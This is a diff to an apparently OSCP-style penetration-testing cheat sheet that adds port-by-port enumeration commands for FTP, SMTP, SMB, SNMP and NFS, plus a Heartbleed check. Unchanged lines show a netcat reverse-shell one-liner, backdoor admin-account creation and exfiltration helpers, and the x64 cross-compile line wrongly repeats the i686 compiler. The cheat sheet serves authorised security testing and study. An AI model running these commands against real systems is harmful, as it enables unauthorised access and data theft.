@@ -14,11 +14,18 @@ Second, run a slower, synchronous scans with scripts.
 
 ## Port 21 - FTP
 ```bash
+ftp $RHOST
+
 # Anonymous login
 nmap --script=ftp-anon -p 21 $RHOST
 
 # Bruteforce logins
 nmap --script=ftp-brute -p 21 $RHOST
+```
+
+## Port 25 - SMTP
+```bash
+nmap –script smtp-commands,smtp-enum-users,smtp-vuln-cve2010-4344, smtp-vuln-cve2011-1720,smtp-vuln-cve2011-1764 -p 25 $RHOST
 ```
 
 ## Port 80 - HTTP
@@ -37,11 +44,58 @@ nmap --script=http-wordpress* -p 80 $RHOST
 wpscan $RHOST
 ```
 
+## Port 110 - POP3
+```bash
+telnet $RHOST 110
+    USER $USER
+    PASS $PASS
+    LIST
+    RETR
+    QUIT
+```
+
+## Port 111 - RPCBind
+```bash
+# List of services running RPC
+# RPC can help find NFS-shares
+rpcbind -p $RHOST
+
+rpcclient -U "" $RHOST
+    srvinfo
+    enumdomusers
+    getdompwinfo
+    querydominfo
+    netshareenum
+    netshareenumall
+```
+
+## Port 135 - MSRPC
+```bash
+# Micro$oft RPC port
+nmap 192.168.0.101 --script=msrpc-enum
+
+rpcclient -U "" $RHOST
+    srvinfo
+    enumdomusers
+    getdompwinfo
+    querydominfo
+    netshareenum
+    netshareenumall
+```
+
 ## Port 139/445 - SMB
 ```bash
-enum4linux [-u username][-p password] $RHOST
+enum4linux [-u $USER][-p $PASS] $RHOST
 
-smbmap [-u username][-p password] $RHOST
+smbmap [-u $USER][-p $PASS] -H $RHOST
+
+smbclient -L \\\\$RHOST\\$SHARE [-U $USER] [$PASS]
+
+# Find NetBIOS info
+nmblookup -A $RHOST
+
+rpcclient -U "" -N $RHOST
+    enumdomusers
 
 # Info dump
 nmap --script=smb-enum*.nse -p 139,445 $RHOST
@@ -53,6 +107,36 @@ nmap --script=smb-os-discovery.nse -p 139,445 $RHOST
 nmap --script=smb-vuln* -p 139,445 $RHOST
 ```
 
+## Port 161 - SNMP
+```bash
+snmpwalk -c public -v1 $RHOST
+
+snmpcheck -t $RHOST -c public
+
+onesixtyone -c $NAMES_FILE -i $RHOST_FILE
+
+snmpenum -t $RHOST
+```
+
+## Port 443 - HTTPS
+```bash
+nmap -sV --script=ssl-heartbleed $RHOST
+```
+
+## Port 2049 - NFS
+```bash
+# Enumeration
+showmount -e $RHOST
+
+# Mounting
+mount $RHOST:/ /tmp/NFS
+mount -t $RHOST:/ /tmp/NFS
+```
+
+## Port 5900 - VNC
+```bash
+vncviewer $RHOST
+```
 
 # 2. Exploitation
 ## MSFVenom Reverse Shell Payloads
@@ -124,7 +208,7 @@ rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc $LHOST $PORT >/tmp/f
 ### Resources
 - https://guif.re/windowseop
 
-### Creating Admin Account
+### Creating Windows Admin Account
 ```bash
 # Victim
 net user /add jack sparrow
@@ -146,6 +230,16 @@ If you have a service account, and want root - try token impersonation!
 [PyInstaller](https://github.com/pyinstaller/pyinstaller) <sup><sub>[[archive](files/PyInstaller-3.6.zip)]
 ```bash
 pyinstaller yourprogram.py
+```
+
+### Cross-compiling for Windows
+
+```
+# x86
+i686-w64-mingw32-gcc [src.c] [-libraries] -o [dst]
+
+# x64
+i686-w64-mingw32-gcc [src.c] [-libraries] -o [dst]
 ```
 
 ## Exfiltration
@@ -184,3 +278,9 @@ CScript zip.vbs $SRC $DEST
 ```bash
 CScript wget.vbs $SRC $DEST
 ```
+
+# Resources
+https://sushant747.gitbooks.io/total-oscp-guide/
+https://guif.re/linuxeop
+https://guif.re/windowseop
+https://github.com/rafiherm/OSCP
